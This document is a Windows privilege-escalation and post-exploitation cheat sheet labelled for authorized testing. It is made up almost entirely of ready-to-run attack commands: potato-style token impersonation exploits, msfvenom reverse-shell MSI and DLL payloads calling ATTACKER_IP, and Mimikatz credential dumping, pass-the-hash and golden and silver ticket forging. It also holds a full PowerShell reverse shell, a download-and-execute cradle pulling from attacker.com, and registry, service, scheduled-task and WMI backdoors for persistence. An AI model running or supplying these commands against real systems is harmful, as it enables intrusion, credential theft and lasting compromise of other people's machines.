# Windows Privilege Escalation - Quick Reference
# For authorized security testing only

# ============================================
# ENUMERATION
# ============================================

# System Information
systeminfo
hostname
net users
net user <username>
net localgroup administrators
netstat -ano
tasklist
wmic os list brief
wmic product list brief
wmic qfe list
wmic startup list full
wmic service list brief
wmic process list brief

# Network Configuration
ipconfig /all
route print
arp -a
netsh firewall show config
netsh advfirewall show allprofiles

# Services
sc query
sc query state= all
sc qc <service_name>
sc start <service_name>
net start
tasklist /SVC

# Installed Software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Drivers
driverquery /v
driverquery /si

# Scheduled Tasks
schtasks /query /fo LIST /v
schtasks /query /tn "TaskName" /fo LIST /v

# ============================================
# USER PRIVILEGES
# ============================================

# Check current user privileges
whoami /priv
whoami /groups
whoami /all

# Common interesting privileges

# SeImpersonatePrivilege (PrintSpoofer, JuicyPotato)
# SeAssignPrimaryPrivilege (Token Manipulation)
# SeTcbPrivilege (Act as part of OS)
# SeBackupPrivilege (Read any file)
# SeRestorePrivilege (Write any file)
# SeCreateTokenPrivilege (Create token)
# SeDebugPrivilege (Debug any process)
# SeLoadDriverPrivilege (Load driver)
# SeTakeOwnershipPrivilege (Take ownership)
# SeShutdownPrivilege (Shutdown system)
# SeTcbPrivilege (Act as part of OS)

# ============================================
# TOKEN MANIPULATION
# ============================================

# PrintSpoofer (SeImpersonatePrivilege)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "cmd /c powershell -e <base64>"

# JuicyPotato (SeImpersonatePrivilege)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# Rogue Potato (SeImpersonatePrivilege)
RoguePotato.exe -r ATTACKER_IP

# GodPotato (SeImpersonatePrivilege)
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato (SeImpersonatePrivilege)
SweetPotato.exe -a "cmd /c whoami"

# ============================================
# UNQUOTED SERVICE PATHS
# ============================================

# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """

# Find unquoted service paths (alternative)
sc qc <service_name>

# Exploit unquoted service path
# Create executable in path
copy /Y C:\Windows\System32\cmd.exe "C:\Program Files\service\service.exe"

# Restart service
sc stop <service_name>
sc start <service_name>

# ============================================
# WEAK SERVICE PERMISSIONS
# ============================================

# Check service permissions
sc sdshow <service_name>

# Modify service binary path
sc config <service_name> binPath= "C:\temp\evil.exe"
sc stop <service_name>
sc start <service_name>

# Add service account
net localgroup administrators <service_account> /add

# ============================================
# ALWAYSINSTALL elevation
# ============================================

# Check if AlwaysInstallElevated is set
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# Install MSI
msiexec /quiet /qn /i evil.msi

# ============================================
# WMI PERSISTENCE
# ============================================

# Create WMI event subscription
wmic /namespace:\\root\subscription class __EventFilter create name="evil",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# ============================================
# SCHEDULED TASKS
# ============================================

# Find writable scheduled tasks
schtasks /query /fo LIST /v

# Modify scheduled task
schtasks /change /tn "TaskName" /tr "C:\temp\evil.exe" /ru SYSTEM

# Create new scheduled task
schtasks /create /tn "EvilTask" /tr "C:\temp\evil.exe" /sc ONLOGON /ru SYSTEM

# ============================================
# DLL HIJACKING
# ============================================

# Find missing DLLs
procmon.exe --filter "NAME NOT CONTAINS dll"

# Common DLL hijack locations

# C:\Windows\Temp\
# C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\
# C:\Windows\System32\

# Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o evil.dll

# ============================================
# UNATTENDED INSTALL FILES
# ============================================

# Find unattended install files
dir /s /b C:\*unattended.xml 2>nul
dir /s /b C:\*sysprep.xml 2>nul
dir /s /b C:\*sysprep.inf 2>nul

# Common locations
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml

# Extract passwords
findstr /C:"Password" C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend.xml

# ============================================
# CREDENTIALS
# ============================================

# Find credentials in files
findstr /spin "password" C:\Windows\*.txt
findstr /spin "password" C:\Windows\*.ini
findstr /spin "password" C:\Windows\*.cfg
findstr /spin "password" C:\Windows\*.config

# Common credential locations

# C:\Windows\System32\config\SAM
# C:\Windows\System32\config\SYSTEM
# C:\Windows\repair\SAM
# C:\Windows\repair\SYSTEM
# C:\inetpub\logs\W3SVC1\u_ex*.log
# C:\Program Files (x86)\web.config
# C:\xampp\phpMyAdmin\config.inc.php
# C:\wamp\apps\phpmyadmin\config.inc.php

# ============================================
# MIMIKATZ
# ============================================

# Basic Mimikatz
mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam

# Pass the Hash
sekurlsa::pth /user:admin /domain:domain.com /ntlm:<hash> /run:cmd.exe

# Golden Ticket
kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-<SID> /krbtgt:<hash> /ptt

# Silver Ticket
kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-<SID> /target:server.domain.com /service:http /rc4:<hash> /ptt

# ============================================
# POWERVIEW
# ============================================

# Import PowerView
Import-Module .\PowerView.ps1

# Find domain controllers
Get-DomainController

# Find domain users
Get-DomainUser

# Find domain groups
Get-DomainGroup

# Find domain computers
Get-DomainComputer

# Find shares
Find-DomainShare

# Find shares with write access
Find-DomainShare -CheckShareAccess

# ============================================
# POWERSHELL REVERSE SHELLS
# ============================================

# PowerShell reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell encoded
powershell -e <base64-encoded-reverse-shell>

# PowerShell download and execute
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# ============================================
# USEFUL TOOLS
# ============================================

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Sherlock
Import-Module .\Sherlock.ps1
Find-AllVulns

# WinPEAS
winpeas.exe

# System Explorer
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "<user>" *

# ============================================
# PERSISTENCE
# ============================================

# Registry Run Keys
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"

# Scheduled Task
schtasks /create /tn "Backdoor" /tr "C:\temp\backdoor.exe" /sc ONLOGON /ru SYSTEM

# Service
sc create Backdoor binPath= "C:\temp\backdoor.exe" start= auto

# Startup Folder
copy backdoor.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# WMI Event Subscription
wmic /namespace:\\root\subscription class __EventFilter create name="backdoor",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
